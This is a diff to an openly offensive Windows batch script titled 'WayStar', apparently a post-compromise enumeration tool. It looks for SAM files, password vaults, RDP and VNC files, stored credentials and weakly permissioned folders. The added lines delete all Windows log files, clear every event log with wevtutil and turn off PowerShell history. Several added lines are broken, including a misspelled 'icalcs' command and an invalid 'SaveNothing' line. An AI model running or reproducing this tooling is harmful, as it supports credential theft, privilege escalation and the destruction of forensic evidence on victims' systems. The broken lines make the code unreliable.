@@ -3,16 +3,17 @@
 @echo off
 
 :: color variables
-SET red=<Esc>[1;31m
-SET black=<Esc>[1;30m
-SET green=<Esc>[1;32m
-SET yellow=<Esc>[1;33m
-SET blue=<Esc>[1;34m
-SET magenta=<Esc>[1;35m
-SET cyan=<Esc>[1;36m
-SET white=<Esc>[1;37m
-SET blink=<Esc>[5m
-SET normal=<Esc>[0m
+SET red=color 04
+SET gray=color 08
+SET black=color 00
+SET green=color 0a
+SET yellow=color 06
+SET blue=color 09
+SET magenta=color 0c
+SET cyan=color 03
+SET white=color 0f
+SET blink=color 0f
+SET normal=color
 
 echo /-----------------------------------------------------------------------------\\
 echo ^|                           %white% %blink%  ⭐%normal%  %cyan% WayStar by SYN-3r %white% %blink%  ⭐%normal%                            %normal% ^|
@@ -36,10 +37,10 @@ echo ^|                            %white% %blink%  .%normal%       %magenta% .^
 echo ^|  %white% %blink%  .%normal%        + +                      %magenta% ^|^|  %magenta%       ^|^|%cyan% ^|: %green% ,       %magenta% :%cyan% ^| %green% ^|               %normal% ^|
 echo ^|              +         %white% %blink%  .%normal%       %white% %blink%  .%normal%     %magenta% ^| %green% .  %magenta%     ,^|%cyan% ^|^|%green% .:      %magenta% .%cyan% ^|%green% ^|    %normal% %white% %blink%  .%normal%       %white% %blink%  .%normal%     ,%normal% ^|
 echo ^|          '                           %magenta% ,^|%green% . %magenta%   %white% %blink%  .%normal% %magenta%   ,:%cyan% ^|%green% ^|^|   %normal% + %magenta% ^|%cyan% ^|%green% '     %normal% ,           %normal% ^|
-echo ^|  %black% __    %normal% +      *                         %green% ,'%magenta%        ,%cyan% '%green% ^|.    %magenta% ,%green% :                 %normal% ^|
-echo ^|%black% ^,  ,---^^^----....____,..^---,^,,----.,.___          %cyan% ,%green% .    %cyan% ,%green% .  .    %black% ____,.,-%normal% ^|
-echo ^|%black% ::::___,---^^,---^   ^  ^ ^::::::::^   ::::^^^---,..___ __,..---^^::::::::   %normal% ^|
-echo ^|%black% --^ ::::::  :^::::::::::::::::::::: ^  ::::::::::::::::: :::  ,,--..,__ :::  %normal% ^|
+echo ^|  %gray% __    %normal% +      *                         %green% ,'%magenta%        ,%cyan% '%green% ^|.    %magenta% ,%green% :                 %normal% ^|
+echo ^|%gray% ^,  ,---^^^----....____,..^---,^,,----.,.___          %cyan% ,%green% .    %cyan% ,%green% .  .    %gray% ____,.,-%normal% ^|
+echo ^|%gray% ::::___,---^^,---^   ^  ^ ^::::::::^   ::::^^^---,..___ __,..---^^::::::::   %normal% ^|
+echo ^|%gray% --^ ::::::  :^::::::::::::::::::::: ^  ::::::::::::::::: :::  ,,--..,__ :::  %normal% ^|
 echo \-----------------------------------------------------------------------------/
 echo.
 echo.
@@ -154,6 +155,7 @@ echo .
 
 echo %cyan% Scheduled tasks: %normal%
 schtasks /query /fo LIST /v ^| findstr "TaskName Author: Run: User:"
+schtasks/query
 
 echo %cyan% SAM and SYSTEM files: %normal%
 dir %SYSTEMROOT%\repair\SAM 2>nul
@@ -169,6 +171,15 @@ echo %cyan% Vnc, kdbx, or rdp files: %normal%
 dir /a /s /b *.kdbx *vnc.ini *.rdp
 echo.
 
+
+echo %cyan% Folders with weak permissions: %normal%
+icalcs "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
+icalcs "C:\Program Files (x86)\*" 2>nul" 2>nul | findstr "(F)" | findstr "Everyone"
+icalcs "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
+echo.
+
+del %WINDIR%\*.log /a /s /q /f
+for /f %a in ('wevtutil el') do @wevtutil cl "%a"
 
 echo %blue% ..................................................... %normal%
 echo %green%                 Other Stuff to add %normal
@@ -186,11 +197,13 @@ wmic logicaldisk get description,name
 
 
 echo %blue% ..................................................... %normal%
-echo %green%                     Powershell   %normal%
+echo %green%                     POWERSHELL   %normal%
 echo %blue% ..................................................... %normal%
 echo .
 
 powershell
+SaveNothing
+MaximumHistoryCount 0
 
 echo %cyan% Version: %normal%
 $psVersionTable
@@ -199,4 +212,11 @@ echo.
 echo %cyan% Antivirus: %normal%
 Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop
 echo.
+
+echo %cyan% Credentials: %normal%
+Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+echo.
+
+
 
